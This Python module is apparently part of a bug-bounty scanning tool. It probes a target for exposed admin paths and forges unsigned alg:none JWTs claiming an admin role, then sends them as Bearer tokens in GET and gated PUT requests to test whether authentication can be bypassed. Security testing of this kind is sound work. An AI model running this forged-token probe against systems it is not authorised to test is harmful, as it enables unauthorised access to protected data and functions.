"""Auth-bypass probe — admin path discovery and JWT alg:none bypass.

Three techniques:
1. Admin path discovery: try common admin/API endpoints; flag 200s that aren't
   login-page redirects.
2. JWT alg:none GET: craft an unsigned JWT, present it as a Bearer token, check
   whether the server accepts it for protected GET paths.
3. JWT alg:none write (requires auth_testing_authorized=True in roe.md): PUT to
   <api-path>/99999 with unsigned JWT; a non-401/403 response confirms write-level
   auth bypass without mutating state (non-existent ID).
"""

from __future__ import annotations

import base64
import json
from urllib.parse import urljoin

import httpx

from earn_money.recon.signals import Signal
from earn_money.triage import hashing

ADMIN_PATHS: tuple[str, ...] = (
    "/admin",
    "/api/Users",
    "/api/SecurityAnswers",
    "/api/Feedbacks",
    "/rest/admin/application-configuration",
    "/administration",
    "/manage",
    "/management",
    "/admin/users",
    "/api/admin",
)

_LOGIN_INDICATORS = ("login", "signin", "sign-in", "authenticate", "401", "403")


def _make_alg_none_jwt(email: str = "admin@juice-sh.op", role: str = "admin") -> str:
    """Craft a JWT with alg:none — no signature — as a read-only probe."""
    header = base64.urlsafe_b64encode(
        json.dumps({"typ": "JWT", "alg": "none"}).encode()
    ).rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(
        json.dumps({"email": email, "role": role}).encode()
    ).rstrip(b"=").decode()
    return f"{header}.{payload}."


def _is_login_redirect(resp: httpx.Response) -> bool:
    if resp.status_code in (301, 302, 303, 307, 308):
        loc = resp.headers.get("location", "").lower()
        return any(ind in loc for ind in _LOGIN_INDICATORS)
    body_lower = resp.text.lower()[:500]
    return any(ind in body_lower for ind in _LOGIN_INDICATORS)


def probe_service(
    base_url: str,
    *,
    client: httpx.Client,
    run_id: str,
    observed_at: str,
    auth_testing_authorized: bool = False,
) -> list[Signal]:
    """Probe `base_url` for admin path access and JWT alg:none bypass."""
    signals: list[Signal] = []

    for path in ADMIN_PATHS:
        url = urljoin(base_url, path)
        try:
            resp = client.get(url)
        except httpx.HTTPError:
            continue
        if resp.status_code == 200 and not _is_login_redirect(resp):
            signals.append(_make_signal(
                url, "admin_path_open",
                f"status={resp.status_code} len={len(resp.text)}",
                run_id=run_id, observed_at=observed_at,
            ))

    jwt = _make_alg_none_jwt()
    api_paths = [p for p in ADMIN_PATHS if "/api/" in p]

    for path in api_paths[:3]:
        api_url = urljoin(base_url, path)
        try:
            resp = client.get(api_url, headers={"Authorization": f"Bearer {jwt}"})
            if resp.status_code == 200 and not _is_login_redirect(resp):
                signals.append(_make_signal(
                    api_url, "jwt_alg_none",
                    f"status={resp.status_code} len={len(resp.text)}",
                    run_id=run_id, observed_at=observed_at,
                ))
        except httpx.HTTPError:
            pass

    if auth_testing_authorized:
        for path in api_paths[:3]:
            sig = _probe_jwt_alg_none_write(
                path, base_url, jwt=jwt, client=client,
                run_id=run_id, observed_at=observed_at,
            )
            if sig:
                signals.append(sig)

    return signals


def _probe_jwt_alg_none_write(
    path: str, base_url: str,
    *, jwt: str, client: httpx.Client, run_id: str, observed_at: str,
) -> Signal | None:
    """PUT to <path>/99999 with alg:none JWT; 404 = bypass, 401/403 = gate working."""
    write_url = urljoin(base_url, path.rstrip("/") + "/99999")
    try:
        resp = client.put(
            write_url,
            headers={"Authorization": f"Bearer {jwt}", "Content-Type": "application/json"},
            content=b"{}",
        )
    except httpx.HTTPError:
        return None
    if resp.status_code in (401, 403):
        return None
    return _make_signal(
        write_url, "jwt_alg_none_write",
        f"status={resp.status_code} (expected 401/403 — write auth bypassed)",
        run_id=run_id, observed_at=observed_at,
    )


def _make_signal(
    url: str, kind: str, evidence: str,
    *, run_id: str, observed_at: str,
) -> Signal:
    asset = hashing.normalize_asset(url)
    target = hashing.normalize_target(url)
    signature = f"auth-bypass|{kind}|{target[:20]}"
    payload = json.dumps(
        {"url": url, "kind": kind, "evidence": evidence, "severity": "high"},
        sort_keys=True,
    )
    return Signal(
        run_id=run_id, tool="auth-bypass-probe", signal_type="auth_bypass_candidate",
        asset=asset, target=target, signature=signature,
        payload=payload, observed_at=observed_at,
    )
